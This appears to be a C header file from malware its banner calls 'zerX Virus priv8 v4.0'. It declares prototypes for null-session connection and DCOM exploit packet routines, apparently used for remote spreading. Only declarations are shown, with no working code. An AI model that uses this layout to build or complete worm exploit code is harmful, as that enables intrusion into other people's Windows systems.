/*     
///////////////////////////////////////////////////////        
													 ./
 XXXXXXX   XXXXXXX XXXXXXXXXX   XXXXXXXX  XXXXXXXX   ./
  	XXXX   XXXX    XXXX   XXX      XXXXX  XXXXX      ./
	 XXXX XXXX     XXXX  XXXX       XXXX  XXXX       ./
	  XXXXXXX	   XXXXXXXXX         XXXXXXXX        ./
	   XXXXX       XXXX   XXX       XXXX XXXXX       ./
        XXX        XXXX   XXXX     XXXXX  XXXXX      ./
         X         XXXX   XXXXX XXXXXXXX  XXXXXXXX   ./
............................zerX,Virus priv8......v4.0/
///////////////////////////////////////////////////////

*/
#ifndef NO_DCOM
BOOL ConnectViaNullSession(const char *remote_host, LPNETRESOURCEW nr);
BOOL CloseNullSession(const char *remote_host);
char *CreateDCOMRequestPacket(EXINFO exinfo, DWORD *RequestPacketSize, int TargetOS, BOOL NamedPipe);
BOOL dcom(EXINFO exinfo);
#endif